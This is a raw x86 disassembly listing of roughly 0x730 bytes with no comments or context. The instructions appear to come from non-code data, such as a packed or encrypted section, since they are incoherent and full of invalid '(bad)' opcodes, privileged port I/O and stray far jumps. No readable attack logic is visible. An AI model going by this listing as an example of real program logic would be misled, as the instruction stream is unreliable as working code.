  41d97f:	mov    ebx,0x21a23ba6
  41d984:	push   ecx
  41d985:	cwde   
  41d986:	int    0x5
  41d988:	call   0xca11:0xe08b8cbd
  41d98f:	scas   ax,WORD PTR es:[edi]
  41d991:	stos   BYTE PTR es:[edi],al
  41d992:	xlat   BYTE PTR ds:[ebx]
  41d993:	jns    0x41d9bc
  41d995:	in     eax,0x87
  41d997:	dec    eax
  41d998:	bnd ret 
  41d99a:	not    DWORD PTR [esi]
  41d99c:	mov    ecx,0xb57bcb63
  41d9a1:	sbb    al,0xd2
  41d9a3:	sub    eax,DWORD PTR [ebp-0x5023b397]
  41d9a9:	pop    esp
  41d9aa:	scas   eax,DWORD PTR es:[edi]
  41d9ab:	or     bl,BYTE PTR [ecx]
  41d9ad:	push   eax
  41d9ae:	mov    ah,ah
  41d9b0:	pop    edi
  41d9b1:	das    
  41d9b2:	jo     0x41d98d
  41d9b4:	fistp  QWORD PTR [edx+0x53]
  41d9b7:	test   DWORD PTR [eax-0x58],0xd8ac3fa1
  41d9be:	clc    
  41d9bf:	cmp    al,0x2c
  41d9c1:	dec    esp
  41d9c2:	jb     0x41da0a
  41d9c4:	mov    dl,0x5c
  41d9c6:	jnp    0x41d94f
  41d9c8:	dec    ebp
  41d9c9:	fsubr  QWORD PTR [ebp+0x2c]
  41d9cc:	inc    esi
  41d9cd:	mov    dh,0xa1
  41d9cf:	mov    ebp,0x761e86e0
  41d9d4:	icebp  
  41d9d5:	ins    BYTE PTR es:[edi],dx
  41d9d6:	scas   eax,DWORD PTR es:[edi]
  41d9d7:	xor    al,0x7b
  41d9d9:	(bad)  
  41d9da:	lods   al,BYTE PTR ds:[esi]
  41d9db:	jno    0x41d995
  41d9dd:	push   0xc4d2ebc6
  41d9e2:	cmp    BYTE PTR [ebx+eax*2-0x59],0x8a
  41d9e7:	in     eax,0x11
  41d9e9:	pop    ds
  41d9ea:	retf   
  41d9eb:	or     ecx,edi
  41d9ed:	mov    al,0xa9
  41d9ef:	ja     0x41d97b
  41d9f1:	aas    
  41d9f2:	in     al,0x78
  41d9f4:	push   0x7ebed4e3
  41d9f9:	stos   DWORD PTR es:[edi],eax
  41d9fa:	inc    esp
  41d9fb:	sbb    al,0xa0
  41d9fd:	shl    BYTE PTR [ebx-0x3a90088e],0x82
  41da04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da05:	aaa    
  41da06:	or     cl,ch
  41da08:	adc    eax,0xb6e4a757
  41da0d:	jecxz  0x41d9a0
  41da0f:	sbb    al,0xbc
  41da11:	aaa    
  41da12:	mov    edi,0x192ccabb
  41da17:	dec    ebp
  41da18:	sbb    eax,0xf81075fd
  41da1d:	into   
  41da1e:	sbb    ah,bl
  41da20:	sbb    dh,BYTE PTR [edx]
  41da22:	dec    edx
  41da23:	adc    edi,0x13ef6c6b
  41da29:	inc    ecx
  41da2a:	xchg   BYTE PTR [edx],cl
  41da2c:	out    dx,eax
  41da2d:	or     eax,0xf5bc6935
  41da32:	ficomp WORD PTR [ebx-0x4434e870]
  41da38:	add    al,0xb5
  41da3a:	cmc    
  41da3b:	aad    0x89
  41da3d:	dec    ebp
  41da3e:	push   es
  41da3f:	fldcw  WORD PTR [ebp-0xaf1c8ff]
  41da45:	jge    0x41da34
  41da47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da48:	pop    edx
  41da49:	dec    edi
  41da4a:	and    eax,0x2f3b6600
  41da4f:	cmp    esp,ebp
  41da51:	add    bl,BYTE PTR [eax-0x6c]
  41da54:	mov    esi,esp
  41da56:	or     DWORD PTR [eax+0x2e],ebp
  41da59:	jns    0x41d9fc
  41da5b:	stc    
  41da5c:	rcl    BYTE PTR [ebx-0x15b73988],cl
  41da62:	cdq    
  41da63:	xchg   ax,ax
  41da65:	mov    esp,DWORD PTR [edx]
  41da67:	inc    eax
  41da68:	inc    DWORD PTR [ebx]
  41da6a:	cdq    
  41da6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da6c:	(bad)  
  41da6d:	div    eax
  41da6f:	jge    0x41da07
  41da71:	clc    
  41da72:	push   esi
  41da73:	repnz les edi,FWORD PTR [edx-0x673ff8eb]
  41da7a:	jnp    0x41dae3
  41da7c:	and    BYTE PTR [esi-0x14],dh
  41da7f:	ins    DWORD PTR es:[edi],dx
  41da80:	jl     0x41da3e
  41da82:	ret    0x2456
  41da85:	jae    0x41da69
  41da87:	sbb    esi,DWORD PTR [edx-0x53850489]
  41da8d:	repz sub DWORD PTR [ebp-0x7],ecx
  41da91:	mov    bh,0xa8
  41da93:	inc    eax
  41da94:	push   cs
  41da95:	inc    esi
  41da96:	in     al,dx
  41da97:	(bad)  
  41da98:	pop    ss
  41da99:	repnz pop ss
  41da9b:	sbb    DWORD PTR [esi-0x14],edi
  41da9e:	mov    BYTE PTR [esi+0x5fd68c60],cl
  41daa4:	daa    
  41daa5:	jno    0x41dac9
  41daa7:	push   edx
  41daa8:	arpl   WORD PTR [esi+0x4749a2a9],ax
  41daae:	out    dx,al
  41daaf:	data16 or BYTE PTR ds:0x9dce5d84,al
  41dab6:	imul   edx,edi,0x9bd123af
  41dabc:	jae    0x41da9b
  41dabe:	add    cl,BYTE PTR [ecx+0x48bbc477]
  41dac4:	ds (bad) 
  41dac6:	push   ss
  41dac7:	inc    ebx
  41dac8:	dec    edx
  41dac9:	ins    DWORD PTR es:[edi],dx
  41daca:	inc    ebp
  41dacb:	dec    edi
  41dacc:	das    
  41dacd:	pop    ebx
  41dace:	int3   
  41dacf:	retf   0x520f
  41dad2:	cdq    
  41dad3:	xchg   ebx,eax
  41dad4:	stos   BYTE PTR es:[edi],al
  41dad5:	ja     0x41dab4
  41dad7:	into   
  41dad8:	mov    BYTE PTR [ecx-0x146d1902],dh
  41dade:	test   DWORD PTR [eax+eax*1+0x5c1eb7e4],esi
  41dae5:	jb     0x41db01
  41dae7:	jo     0x41dac7
  41dae9:	cwde   
  41daea:	pop    edi
  41daeb:	aad    0x1b
  41daed:	fld    QWORD PTR [ecx-0x7eec83d4]
  41daf3:	loop   0x41dabd
  41daf5:	es ins BYTE PTR es:[edi],dx
  41daf7:	ja     0x41da7f
  41daf9:	or     esi,DWORD PTR [ecx-0x2d]
  41dafc:	fild   QWORD PTR [esi+eiz*2-0x66bf3fda]
  41db03:	lds    edi,FWORD PTR [ebx-0x3bf2f503]
  41db09:	outs   dx,DWORD PTR ds:[esi]
  41db0a:	or     ecx,DWORD PTR [eax]
  41db0c:	(bad)  
  41db0d:	push   eax
  41db0e:	inc    esi
  41db0f:	inc    edi
  41db10:	jmp    0x11bf:0x1f103226
  41db17:	daa    
  41db18:	mov    edx,0x14238ce4
  41db1d:	sub    eax,0x4c97ca34
  41db22:	pop    ds
  41db23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db24:	sahf   
  41db25:	mov    esi,0xe5f6e8bb
  41db2a:	cmp    BYTE PTR [eax+edx*8],dh
  41db2d:	jbe    0x41db86
  41db2f:	cmp    al,BYTE PTR [ebp-0x49]
  41db32:	jb     0x41db2b
  41db34:	cld    
  41db35:	mov    bh,bl
  41db37:	inc    eax
  41db38:	jp     0x41dae2
  41db3a:	into   
  41db3b:	mov    cl,0x6b
  41db3d:	add    dh,dh
  41db3f:	inc    eax
  41db40:	xchg   BYTE PTR [ebx],ch
  41db42:	push   ds
  41db43:	and    ch,0x32
  41db46:	sub    eax,0x2447db70
  41db4b:	ss cwde 
  41db4d:	pop    ebx
  41db4e:	inc    edx
  41db4f:	das    
  41db50:	adc    ah,al
  41db52:	sub    esi,DWORD PTR [ebx+ebx*2+0x4cc7b11f]
  41db59:	fimul  WORD PTR [edx-0x790a6a9]
  41db5f:	dec    ebp
  41db60:	shl    BYTE PTR [ecx-0x6433f7d0],cl
  41db66:	xchg   esp,eax
  41db67:	dec    edi
  41db68:	cld    
  41db69:	cmp    edx,DWORD PTR [ebx]
  41db6b:	xchg   esp,eax
  41db6c:	fsubr  QWORD PTR [ecx-0x7381db7c]
  41db72:	cmc    
  41db73:	adc    ebx,eax
  41db75:	adc    eax,0x97df3513
  41db7a:	mov    edx,0x90089fa0
  41db7f:	(bad)  
  41db80:	cmp    al,0xa9
  41db82:	add    bh,al
  41db84:	mov    es,ebx
  41db86:	jnp    0x41db70
  41db88:	cmc    
  41db89:	jecxz  0x41db2f
  41db8b:	and    BYTE PTR ds:0x4bf8ff54,al
  41db91:	push   cs
  41db92:	mul    BYTE PTR [ebx]
  41db94:	(bad)  
  41db95:	dec    ebp
  41db96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db97:	arpl   WORD PTR [ecx],dx
  41db99:	pushf  
  41db9a:	and    BYTE PTR [esi],ah
  41db9c:	hlt    
  41db9d:	inc    esp
  41db9e:	mov    esp,0x185c98fd
  41dba3:	mov    DWORD PTR [edi-0x485fb74d],eax
  41dba9:	sub    dh,0x19
  41dbac:	stos   BYTE PTR es:[edi],al
  41dbad:	jp     0x41dc0e
  41dbaf:	cmc    
  41dbb0:	jg     0x41db50
  41dbb2:	imul   esp
  41dbb4:	sub    BYTE PTR [esp+ebx*8+0x44ba1c9e],al
  41dbbb:	daa    
  41dbbc:	pop    ecx
  41dbbd:	ins    DWORD PTR es:[edi],dx
  41dbbe:	mov    bh,0xb6
  41dbc0:	xchg   esp,eax
  41dbc1:	shr    ebx,0x78
  41dbc4:	push   edi
  41dbc5:	(bad)  [edi-0x217d7b51]
  41dbcb:	retf   
  41dbcc:	fmul   DWORD PTR [esi+0x62]
  41dbcf:	jnp    0x41dbd1
  41dbd1:	icebp  
  41dbd2:	lds    esi,FWORD PTR [eax-0x5a4b6776]
  41dbd8:	fsub   DWORD PTR gs:[ecx-0x68]
  41dbdc:	pop    esp
  41dbdd:	lock jmp 0x41dbd5
  41dbe0:	push   ebp
  41dbe1:	imul   edx,DWORD PTR [ebp-0x75],0x65b0b6e0
  41dbe8:	sub    eax,0xed2e958c
  41dbed:	fistp  WORD PTR ds:0x827d50d2
  41dbf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbf4:	or     al,0xcd
  41dbf6:	rcr    bh,1
  41dbf8:	fistp  WORD PTR [ecx+0x24]
  41dbfb:	repz enter 0xf1ab,0xb8
  41dc00:	dec    ecx
  41dc01:	nop
  41dc02:	sahf   
  41dc03:	sbb    al,0x18
  41dc05:	push   es
  41dc06:	and    DWORD PTR [edi],ebx
  41dc08:	stos   BYTE PTR es:[edi],al
  41dc09:	sub    eax,0x4f5603d6
  41dc0e:	popf   
  41dc0f:	mov    WORD PTR [ebx-0x51e26f66],?
  41dc15:	jae    0x41dc80
  41dc17:	imul   eax
  41dc19:	jl     0x41dbc6
  41dc1b:	and    eax,0x63f335d
  41dc20:	sar    BYTE PTR [edx+0x11],cl
  41dc23:	dec    ebx
  41dc24:	inc    BYTE PTR [edx-0xef478a7]
  41dc2a:	es sub eax,edi
  41dc2d:	popf   
  41dc2e:	das    
  41dc2f:	sbb    edx,DWORD PTR [edi+edx*4]
  41dc32:	or     edx,DWORD PTR [ecx]
  41dc34:	push   ecx
  41dc35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc36:	repz aam 0xba
  41dc39:	fwait
  41dc3a:	or     eax,DWORD PTR [esi]
  41dc3c:	and    al,0xba
  41dc3e:	stos   DWORD PTR es:[edi],eax
  41dc3f:	aaa    
  41dc40:	sbb    al,0xf2
  41dc42:	mov    ch,0x2c
  41dc44:	xchg   DWORD PTR [esi+0x37],ecx
  41dc47:	test   eax,0x7818e96c
  41dc4c:	jbe    0x41dc96
  41dc4e:	jecxz  0x41dc77
  41dc50:	arpl   WORD PTR [esi],bx
  41dc52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc53:	adc    eax,0x53ad31c1
  41dc58:	pop    esp
  41dc59:	inc    eax
  41dc5a:	push   ss
  41dc5b:	imul   DWORD PTR [ebp-0xe681ab6]
  41dc61:	and    esi,DWORD PTR [eax+0x79]
  41dc64:	push   0xffffffa1
  41dc66:	fs pop esp
  41dc68:	int    0x2a
  41dc6a:	hlt    
  41dc6b:	inc    esi
  41dc6c:	jecxz  0x41dc33
  41dc6e:	jae    0x41dc65
  41dc70:	icebp  
  41dc71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc73:	or     edi,DWORD PTR [esi+ecx*1]
  41dc76:	push   0x7
  41dc78:	inc    esp
  41dc79:	cmc    
  41dc7a:	jecxz  0x41dcb7
  41dc7c:	dec    esp
  41dc7d:	pop    edx
  41dc7e:	mov    esi,0x1ebbe88c
  41dc83:	dec    edx
  41dc84:	aas    
  41dc85:	mov    al,0x2d
  41dc87:	pop    esp
  41dc88:	into   
  41dc89:	test   eax,0x1994411a
  41dc8e:	leave  
  41dc8f:	mov    bh,0xa
  41dc91:	sti    
  41dc92:	adc    ebx,edx
  41dc94:	js     0x41dc77
  41dc96:	not    BYTE PTR [eax+esi*2+0x48]
  41dc9a:	imul   ecx,DWORD PTR [ebx+0x8046e7a],0xed1cf1c2
  41dca4:	mov    ebx,0xac580ffb
  41dca9:	xor    ecx,ecx
  41dcab:	mov    edi,0xf54dbbd4
  41dcb0:	inc    esi
  41dcb1:	pushf  
  41dcb2:	or     BYTE PTR [eax+0x7583b961],0x3d
  41dcb9:	arpl   WORD PTR [ecx],cx
  41dcbb:	mov    esp,0xd9641096
  41dcc0:	lods   eax,DWORD PTR ds:[esi]
  41dcc1:	pop    ebx
  41dcc2:	(bad)  
  41dcc3:	mov    eax,ds:0x988b43c2
  41dcc8:	mov    eax,DWORD PTR [eax+0x1c]
  41dccb:	mov    esp,0xf3b24abc
  41dcd0:	jmp    0x41dcae
  41dcd2:	fistp  WORD PTR [esi+0x3ef0140c]
  41dcd8:	jle    0x41dd41
  41dcda:	adc    BYTE PTR [ebx+0x1286d948],ch
  41dce0:	xchg   esi,eax
  41dce1:	mov    WORD PTR [ecx+0x15],fs
  41dce4:	shl    BYTE PTR [esi+0x697f3019],0x8f
  41dceb:	test   DWORD PTR [edi-0x4e],eax
  41dcee:	and    edx,DWORD PTR [eax]
  41dcf0:	inc    esi
  41dcf1:	(bad)  
  41dcf2:	adc    DWORD PTR [ecx-0x32692335],edi
  41dcf8:	sar    ebp,cl
  41dcfa:	aam    0xa7
  41dcfc:	adc    eax,eax
  41dcfe:	xor    BYTE PTR [ebp-0x645a4e96],cl
  41dd04:	jbe    0x41dce6
  41dd06:	dec    esp
  41dd07:	pop    ecx
  41dd08:	sbb    eax,0x90ca441
  41dd0d:	jns    0x41dcfa
  41dd0f:	or     edi,DWORD PTR [ecx+0xed62b4c]
  41dd15:	mov    DWORD PTR [edi-0x8],edi
  41dd18:	lods   eax,DWORD PTR ds:[esi]
  41dd19:	mov    bl,0xa4
  41dd1b:	fisttp WORD PTR [esi]
  41dd1d:	outs   dx,DWORD PTR ds:[esi]
  41dd1e:	xchg   ebp,eax
  41dd1f:	sub    DWORD PTR [edi],0xffffffcf
  41dd22:	sub    BYTE PTR [esi-0x3a],bl
  41dd25:	xchg   edi,eax
  41dd26:	mov    ch,0xe5
  41dd28:	xchg   BYTE PTR [esi+0x73],dh
  41dd2b:	pop    esi
  41dd2c:	mov    edi,0x80e53f37
  41dd31:	xchg   bx,ax
  41dd33:	push   esp
  41dd34:	clc    
  41dd35:	mov    ecx,0x75b003ba
  41dd3a:	in     al,dx
  41dd3b:	pop    ss
  41dd3c:	(bad)  
  41dd3d:	pop    ss
  41dd3e:	in     al,0xfa
  41dd40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd41:	int    0x30
  41dd43:	(bad)  
  41dd44:	sub    ecx,esi
  41dd46:	cs push ebx
  41dd48:	jmp    DWORD PTR [edx-0x4c]
  41dd4b:	mov    al,ds:0x5689a706
  41dd50:	into   
  41dd51:	imul   ebp,DWORD PTR [ebx-0x6a54603e],0xffffffbf
  41dd58:	aas    
  41dd59:	mov    esp,0x79f182be
  41dd5e:	and    BYTE PTR [ecx],dl
  41dd60:	adc    esp,DWORD PTR fs:[edi]
  41dd63:	int3   
  41dd64:	pop    es
  41dd65:	retf   0x9481
  41dd68:	xchg   edx,eax
  41dd69:	mov    dh,0xed
  41dd6b:	mov    ecx,DWORD PTR [ebx+0x7c]
  41dd6e:	add    ebp,DWORD PTR [ebp-0x5a]
  41dd71:	or     dh,0x28
  41dd74:	xor    al,0x91
  41dd76:	leave  
  41dd77:	add    DWORD PTR [ebx],0xffffff9d
  41dd7a:	inc    edi
  41dd7b:	mov    dl,BYTE PTR [edx+0x30]
  41dd7e:	jno    0x41ddfe
  41dd80:	sub    eax,0x2732cd81
  41dd86:	push   0x11
  41dd88:	adc    al,0xb1
  41dd8a:	lock sub eax,DWORD PTR [ecx+esi*1]
  41dd8e:	stc    
  41dd8f:	jp     0x41dda1
  41dd91:	adc    al,0xa7
  41dd93:	jl     0x41ddb3
  41dd95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd96:	int    0xe1
  41dd98:	push   cs
  41dd99:	leave  
  41dd9a:	cmp    bl,BYTE PTR [esi-0x6a]
  41dd9d:	jno    0x1714f4b1
  41dda3:	outs   dx,BYTE PTR ds:[esi]
  41dda4:	call   0x232fe5d
  41dda9:	(bad)  
  41ddaa:	aas    
  41ddab:	mov    edx,0xe264de77
  41ddb0:	clc    
  41ddb1:	jb     0x41ddaf
  41ddb3:	cli    
  41ddb4:	test   al,0x63
  41ddb6:	dec    ecx
  41ddb7:	inc    edx
  41ddb8:	jle    0x41dd6e
  41ddba:	std    
  41ddbb:	int3   
  41ddbc:	add    al,0xc2
  41ddbe:	imul   BYTE PTR [ebp+0x521935ca]
  41ddc4:	pop    ebx
  41ddc5:	and    cl,ch
  41ddc7:	ins    DWORD PTR es:[edi],dx
  41ddc8:	imul   DWORD PTR [ebx+0x7e]
  41ddcb:	mov    dh,0x4c
  41ddcd:	ds daa 
  41ddcf:	push   ss
  41ddd0:	mov    cl,0xf9
  41ddd2:	nop
  41ddd3:	rcl    ah,1
  41ddd5:	sbb    DWORD PTR [ebx],esp
  41ddd7:	mov    ds:0x6e893d20,eax
  41dddc:	push   ds
  41dddd:	addr16 ds (bad) 
  41dde0:	out    dx,eax
  41dde1:	lods   al,BYTE PTR ds:[esi]
  41dde2:	jb     0x41de54
  41dde4:	cmc    
  41dde5:	into   
  41dde6:	pop    ds
  41dde7:	mov    cs,WORD PTR [esi+0xf]
  41ddea:	jb     0x41de41
  41ddec:	out    0xbf,eax
  41ddee:	push   edi
  41ddef:	sti    
  41ddf0:	retf   
  41ddf1:	sar    BYTE PTR [edi-0x6b],1
  41ddf4:	int3   
  41ddf5:	(bad)  
  41ddf6:	or     eax,ecx
  41ddf8:	(bad)  
  41ddf9:	inc    BYTE PTR [eax]
  41ddfb:	scas   eax,DWORD PTR es:[edi]
  41ddfc:	jnp    0x41de17
  41ddfe:	in     al,dx
  41ddff:	cmp    eax,esi
  41de01:	jl     0x41de19
  41de03:	xor    al,BYTE PTR [esi-0x25d6d3c6]
  41de09:	push   0x34
  41de0b:	loope  0x41de73
  41de0d:	fld    TBYTE PTR [ecx]
  41de0f:	dec    eax
  41de10:	(bad)  
  41de11:	ja     0x41dda8
  41de13:	sbb    al,0x48
  41de15:	sub    al,0xbb
  41de17:	sahf   
  41de18:	iret   
  41de19:	data16 (bad) 
  41de1b:	ss pop edi
  41de1d:	mov    WORD PTR [ebx],cs
  41de1f:	xchg   esp,eax
  41de20:	sub    bl,cl
  41de22:	outs   dx,DWORD PTR ds:[esi]
  41de23:	jae    0x41ddbb
  41de25:	push   ds
  41de26:	loop   0x41ddab
  41de28:	(bad)  
  41de29:	imul   eax,DWORD PTR [esi-0x6c],0xffffffb5
  41de2d:	jb     0x41de90
  41de2f:	sub    eax,0xbfe116cb
  41de34:	mov    eax,ds:0xa8ee2109
  41de39:	fld    QWORD PTR [edx-0x58b9dd52]
  41de3f:	push   es
  41de40:	mov    DWORD PTR [edx-0x62766eca],edi
  41de46:	std    
  41de47:	push   ebx
  41de48:	pushf  
  41de49:	xchg   esp,eax
  41de4a:	sub    bh,ah
  41de4c:	and    BYTE PTR [esi+0x1add0b1a],cl
  41de52:	js     0x41de7a
  41de54:	push   ds
  41de55:	sub    al,0xed
  41de57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de58:	fstp   TBYTE PTR [ecx+eiz*1+0x40ed644b]
  41de5f:	or     al,BYTE PTR [eax+0x33ea41d1]
  41de65:	or     al,0xb8
  41de67:	cli    
  41de68:	retf   0x4e6d
  41de6b:	or     esp,DWORD PTR [edx]
  41de6d:	cdq    
  41de6e:	dec    edi
  41de6f:	sar    DWORD PTR [esi-0x4c41eabc],0x3b
  41de76:	je     0x41de10
  41de78:	and    DWORD PTR [ebp-0x31],ebx
  41de7b:	push   ebx
  41de7c:	clc    
  41de7d:	push   ecx
  41de7e:	xchg   ecx,eax
  41de7f:	jnp    0x41de06
  41de81:	into   
  41de82:	mov    edi,0x422bc1ee
  41de87:	leave  
  41de88:	push   ecx
  41de89:	fcomp  st(1)
  41de8b:	and    ax,0x2f8
  41de8f:	leave  
  41de90:	adc    BYTE PTR [eax-0x78458210],al
  41de96:	sbb    edx,DWORD PTR [edx-0x2d573152]
  41de9c:	sbb    al,0xf5
  41de9e:	xchg   ecx,eax
  41de9f:	pop    es
  41dea0:	push   esi
  41dea1:	cmp    BYTE PTR [edi+0x6970db7f],bh
  41dea7:	jp     0x41df1a
  41dea9:	push   cs
  41deaa:	fwait
  41deab:	ror    ebx,1
  41dead:	ficomp WORD PTR [ebx]
  41deaf:	call   0xd88e:0xd7244b3b
  41deb6:	push   ebx
  41deb7:	or     al,0x77
  41deb9:	adc    edx,edx
  41debb:	std    
  41debc:	xchg   edi,eax
  41debd:	xchg   ebp,eax
  41debe:	div    bh
  41dec0:	dec    ebp
  41dec1:	and    ah,BYTE PTR [ebx+0x4f0c1a27]
  41dec7:	test   eax,0x7753d796
  41decd:	inc    ebx
  41dece:	xor    al,0x5d
  41ded0:	or     BYTE PTR [edx-0x2705b515],ch
  41ded6:	in     al,0xff
  41ded8:	(bad)  
  41ded9:	fsin   
  41dedb:	mov    dh,0xae
  41dedd:	push   esi
  41dede:	idiv   DWORD PTR [edx]
  41dee0:	or     al,0xb2
  41dee2:	mov    cs,WORD PTR [eax]
  41dee4:	mov    ebx,0xf815ba27
  41dee9:	mov    edx,0xc520ecc9
  41deee:	dec    ebx
  41deef:	imul   ebx,ecx,0x769fd9a5
  41def5:	gs push 0x47
  41def8:	(bad)  
  41def9:	imul   edx,DWORD PTR [ebx+0x73],0xffffffa3
  41defd:	sbb    eax,0x13d8f241
  41df02:	out    0xe2,al
  41df04:	lods   eax,DWORD PTR ds:[esi]
  41df05:	dec    eax
  41df06:	sbb    al,0x76
  41df08:	lock test ecx,ebp
  41df0b:	shl    DWORD PTR [esi-0x50575c4e],cl
  41df11:	xor    BYTE PTR [edi],dh
  41df13:	out    dx,eax
  41df14:	lahf   
  41df15:	icebp  
  41df16:	leave  
  41df17:	pop    eax
  41df18:	or     eax,0x568b4b5d
  41df1d:	and    dl,BYTE PTR [ebx-0x77cad692]
  41df23:	push   eax
  41df24:	sahf   
  41df25:	xor    al,0xbd
  41df27:	xor    BYTE PTR [edx+0x60],ah
  41df2a:	pop    ebp
  41df2b:	in     eax,dx
  41df2c:	dec    esp
  41df2d:	pop    esi
  41df2e:	push   edi
  41df2f:	adc    bl,dl
  41df31:	test   ah,0x9c
  41df34:	mov    esp,0x4a54acd5
  41df39:	push   edx
  41df3a:	jae    0x41df3b
  41df3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df3d:	ror    DWORD PTR gs:[ebp-0x32ee1dea],cl
  41df44:	xchg   edi,eax
  41df45:	ret    0x64fd
  41df48:	jecxz  0x41df54
  41df4a:	fistp  DWORD PTR [edx-0x24115b03]
  41df50:	add    BYTE PTR [ebx+0x25],0xe
  41df54:	sub    BYTE PTR [esi-0x6a745c4e],0xaa
  41df5b:	icebp  
  41df5c:	add    BYTE PTR ss:[eax],dh
  41df5f:	jnp    0x41df0d
  41df61:	pop    ds
  41df62:	add    eax,0xaa5c4b9a
  41df67:	repz and eax,0x10c7e901
  41df6d:	sbb    al,0xd8
  41df6f:	aaa    
  41df70:	cmc    
  41df71:	iret   
  41df72:	or     al,0x3f
  41df74:	stos   BYTE PTR es:[edi],al
  41df75:	imul   edx,DWORD PTR [eax*2-0x70b5798e],0xffffff9d
  41df7d:	push   esi
  41df7e:	(bad)  
  41df7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df80:	xchg   edi,eax
  41df81:	cwde   
  41df82:	retf   0xc92a
  41df85:	or     ebx,DWORD PTR [eax]
  41df87:	(bad)  [ebp+0x0]
  41df8a:	imul   ebx,ebx,0x329ec02e
  41df90:	out    0x41,al
  41df92:	gs stos BYTE PTR es:[edi],al
  41df94:	outs   dx,BYTE PTR ds:[esi]
  41df95:	repz je 0x41df55
  41df98:	nop
  41df99:	add    esp,ebp
  41df9b:	mov    bl,0xbe
  41df9d:	adc    DWORD PTR [ecx-0x22],esi
  41dfa0:	out    0x33,eax
  41dfa2:	ds (bad) 
  41dfa4:	hlt    
  41dfa5:	sti    
  41dfa6:	xchg   esi,eax
  41dfa7:	push   0xffffffc9
  41dfa9:	popf   
  41dfaa:	stos   DWORD PTR es:[edi],eax
  41dfab:	sbb    ch,BYTE PTR [esi+0x7d]
  41dfae:	dec    esi
  41dfaf:	adc    DWORD PTR [edi],edx
  41dfb1:	add    eax,0xc489b0a7
  41dfb6:	arpl   WORD PTR ds:0x7c61aad0,dx
  41dfbc:	out    dx,eax
  41dfbd:	xor    BYTE PTR [ebx],0x6a
  41dfc0:	or     edx,edi
  41dfc2:	sbb    ebp,DWORD PTR [edx-0x7f9981f4]
  41dfc8:	fimul  WORD PTR [esi+0x45]
  41dfcb:	es dec edi
  41dfcd:	inc    esi
  41dfce:	sbb    BYTE PTR [ebp-0x1629bfbf],0x18
  41dfd5:	sub    eax,0xdbe6ace8
  41dfda:	int3   
  41dfdb:	xchg   esp,eax
  41dfdc:	scas   eax,DWORD PTR es:[edi]
  41dfdd:	xchg   DWORD PTR [ebx-0x9],edi
  41dfe0:	lea    esi,[edi+0x15055c3b]
  41dfe6:	rol    DWORD PTR [edx-0x6c],1
  41dfe9:	xor    al,BYTE PTR [ebx+ebx*4+0x75]
  41dfed:	repnz ins DWORD PTR es:[edi],dx
  41dfef:	ins    BYTE PTR es:[edi],dx
  41dff0:	jl     0x41dfbf
  41dff2:	lds    ecx,FWORD PTR [ebp-0x76]
  41dff5:	mov    esi,0x5bd7dcd4
  41dffa:	stc    
  41dffb:	fcomp  DWORD PTR [edi]
  41dffd:	or     DWORD PTR ds:0xf5785896,esp
  41e003:	cmp    BYTE PTR [esi-0x2029121a],dh
  41e009:	inc    ebp
  41e00a:	bound  ecx,QWORD PTR [edx]
  41e00c:	lahf   
  41e00d:	pop    ecx
  41e00e:	call   0xe1e:0xac333142
  41e015:	sub    DWORD PTR [edi+eiz*4-0xd],esi
  41e019:	inc    ebp
  41e01a:	cmp    al,0x3d
  41e01c:	leave  
  41e01d:	pusha  
  41e01e:	and    eax,0x479a25d0
  41e023:	lds    ebp,FWORD PTR [edi-0x7d]
  41e026:	push   es
  41e027:	fisttp WORD PTR [eax-0x29]
  41e02a:	sub    esp,ebx
  41e02c:	adc    al,0x11
  41e02e:	fs aas 
  41e030:	xor    bl,dl
  41e032:	sub    BYTE PTR [ebp+0x24],ah
  41e035:	(bad)  
  41e036:	sub    BYTE PTR [eax],0xe5
  41e039:	xor    eax,0x351c1d7c
  41e03e:	loop   0x41e011
  41e040:	and    al,0xb7
  41e042:	sahf   
  41e043:	(bad)  
  41e044:	adc    edx,eax
  41e046:	add    BYTE PTR [ecx+0x6881948f],0x3
  41e04d:	stos   BYTE PTR es:[edi],al
  41e04e:	shr    BYTE PTR [ecx+0x5d50e3a8],0x18
  41e055:	xchg   BYTE PTR ds:0xafa6a370,bl
  41e05b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e05c:	jge    0x41dff7
  41e05e:	sbb    BYTE PTR [esi-0x64d6b62a],bh
  41e064:	dec    edx
  41e065:	or     DWORD PTR [esi],ebp
  41e067:	cmp    al,0xd8
  41e069:	xsha1  (bad)
  41e06a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e06b:	or     ebx,DWORD PTR [eax-0x2b]
  41e06e:	lods   eax,DWORD PTR ds:[esi]
  41e06f:	scas   eax,DWORD PTR es:[edi]
  41e070:	test   BYTE PTR [eax],bh
  41e072:	pop    esp
  41e073:	push   0xffffffc7
  41e075:	jmp    0x41e0bf
  41e077:	out    dx,eax
  41e078:	aas    
  41e079:	add    eax,0x95f8fa22
  41e07e:	mov    ah,0x68
  41e080:	hlt    
  41e081:	push   edi
  41e082:	pop    esi
  41e083:	jmp    0x76d0c931
  41e088:	sub    eax,0xb92c30c9
  41e08d:	sub    ebx,DWORD PTR [ebx-0x3bb2be67]
  41e093:	aam    0x37
  41e095:	cli    
  41e096:	dec    edi
  41e097:	mov    edi,0xb7c17bda
  41e09c:	jo     0x41e0df
  41e09e:	in     al,0x92
  41e0a0:	jg     0x41e04d
  41e0a2:	mov    esi,?
  41e0a4:	rol    BYTE PTR [edx-0x4f],0x51
  41e0a8:	pop    esp
  41e0a9:	jno    0x41e0e9
  41e0ab:	pop    eax
  41e0ac:	jmp    0x55ee28bd
  41e0b1:	popf   
  41e0b2:	inc    edx
